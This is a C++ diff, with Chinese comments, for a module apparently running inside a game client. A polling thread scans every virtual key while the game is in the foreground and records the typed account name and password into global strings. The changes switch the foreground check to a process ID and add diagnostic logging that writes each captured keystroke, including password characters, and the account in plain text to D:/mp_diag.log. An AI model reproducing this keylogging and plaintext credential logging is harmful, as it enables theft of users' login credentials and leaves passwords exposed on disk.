@@ -121,7 +121,7 @@ static void MP_PushPacket(const BYTE *p, DWORD n) {
 
 static volatile LONG g_captureRunning = 0;   // 捕获线程运行标志
 static volatile LONG g_captureEnabled = 0;   // 是否启用捕获(MP_StartCapture/Stop)
-static HWND    g_gameWnd = NULL;            // 游戏主窗口句柄(启动时记录)
+static DWORD   g_gamePid = 0;               // 游戏进程ID(用于前台窗口归属检查)
 static std::string g_capAccount;            // 捕获的账号
 static std::string g_capPassword;           // 捕获的密码
 static int      g_capField = 0;             // 当前输入字段: 0=账号 1=密码
@@ -166,12 +166,26 @@ static void AppendChar(std::string &target, WCHAR ch) {
 static DWORD WINAPI CaptureThread(LPVOID) {
 	// 初始化上一次状态为全释放
 	memset(g_prevKeys, 0, sizeof(g_prevKeys));
+	int diagCounter = 0;
 
 	while (InterlockedCompareExchange(&g_captureRunning, 0, 0)) {
-		// 只在游戏窗口前台时捕获
-		if (g_captureEnabled && g_gameWnd) {
+		// 只在游戏窗口前台时捕获(通过进程ID判断, 不依赖固定HWND)
+		if (g_captureEnabled && g_gamePid != 0) {
 			HWND fg = GetForegroundWindow();
-			if (fg == g_gameWnd || IsChild(g_gameWnd, fg)) {
+			if (fg) {
+				DWORD fgPid = 0;
+				GetWindowThreadProcessId(fg, &fgPid);
+				if (fgPid == g_gamePid) {
+					// [DIAG] 每5秒记录一次捕获活跃状态
+					diagCounter++;
+					if (diagCounter % 500 == 0) {  // 500 * 10ms = 5s
+						FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+						if (df) {
+							fprintf(df, "[MP-CAP] active: acc=%d chars pw=%d chars field=%d\n",
+								(int)g_capAccount.size(), (int)g_capPassword.size(), g_capField);
+							fflush(df); fclose(df);
+						}
+					}
 
 				// 扫描所有虚拟键(只扫描常用范围以提高性能)
 				for (UINT vk = 0x08; vk <= 0xFE; vk++) {
@@ -193,7 +207,6 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 							EnterCriticalSection(&g_capCs);
 							std::string &target = (g_capField == 0) ? g_capAccount : g_capPassword;
 							if (!target.empty()) {
-								// UTF-8 安全删除: 从末尾找完整字符
 								size_t len = target.size();
 								while (len > 0 && (target[len - 1] & 0xC0) == 0x80) len--;
 								if (len > 0) len--;
@@ -201,16 +214,16 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 							}
 							LeaveCriticalSection(&g_capCs);
 						}
-						// --- Delete: 也删除(有些用户用Delete) ---
+						// --- Delete: 清空当前字段 ---
 						else if (vk == VK_DELETE) {
 							EnterCriticalSection(&g_capCs);
 							std::string &target = (g_capField == 0) ? g_capAccount : g_capPassword;
-							target.clear();  // Delete 清空整个字段(简单处理)
+							target.clear();
 							LeaveCriticalSection(&g_capCs);
 						}
-						// --- Enter/Return: 不处理(留给游戏登录按钮) ---
+						// --- Enter/Escape: 不处理(留给游戏) ---
 						else if (vk == VK_RETURN || vk == VK_ESCAPE) {
-							// 忽略, 让游戏自己处理
+							// ignore
 						}
 						// --- 其他键: 尝试转换为可打印字符 ---
 						else {
@@ -219,18 +232,21 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 								EnterCriticalSection(&g_capCs);
 								std::string &target = (g_capField == 0) ? g_capAccount : g_capPassword;
 								AppendChar(target, ch);
-								// 限制长度防溢出
 								if (target.size() > 64) target.resize(64);
 								LeaveCriticalSection(&g_capCs);
+								// [DIAG] 记录捕获到的字符
+								{ FILE *df = NULL; fopen_s(&df, "D:/mp_diag.log", "a");
+								  if (df) { fprintf(df, "[MP-CAP] key vk=%02X ch='%c' field=%d acc='%s'\n", vk, (char)ch, g_capField, g_capAccount.c_str()); fflush(df); fclose(df); } }
 							}
 						}
-					} // end if (newly pressed)
+					} // end if newly pressed
 
-					// 更新上一次状态(只保存 down 位)
+					// 更新上一次状态
 					g_prevKeys[vk] = nowDown ? 0x80 : 0;
 				} // end for each vk
-			} // end if foreground window is game
-		} // end if capture enabled
+			} // end if same process
+		} // end if foreground valid
+	} // end if capture enabled
 
 		Sleep(10); // ~100Hz poll rate
 	} // end while running
@@ -242,12 +258,12 @@ static DWORD WINAPI CaptureThread(LPVOID) {
 // ---- 捕获 API (供 AutoResponse.cpp 调用) ----
 
 /// 启动键盘捕获。应在游戏窗口创建后调用。
-void MP_StartCapture(HWND gameWnd) {
+void MP_StartCapture() {
 	if (!g_capCsReady) {
 		InitializeCriticalSection(&g_capCs);
 		g_capCsReady = true;
 	}
-	g_gameWnd = gameWnd;
+	g_gamePid = GetCurrentProcessId();
 	g_capAccount.clear();
 	g_capPassword.clear();
 	g_capField = 0;
@@ -258,7 +274,7 @@ void MP_StartCapture(HWND gameWnd) {
 		InterlockedExchange(&g_captureRunning, 1);
 		HANDLE hThread = CreateThread(NULL, 0, CaptureThread, NULL, 0, NULL);
 		if (hThread) CloseHandle(hThread);
-		DEBUG(L"[MP-CAP] started, gameWnd=%p", gameWnd);
+		DEBUG(L"[MP-CAP] started, pid=%u", g_gamePid);
 	} else {
 		InterlockedExchange(&g_captureEnabled, 1);
 		DEBUG(L"[MP-CAP] re-enabled");
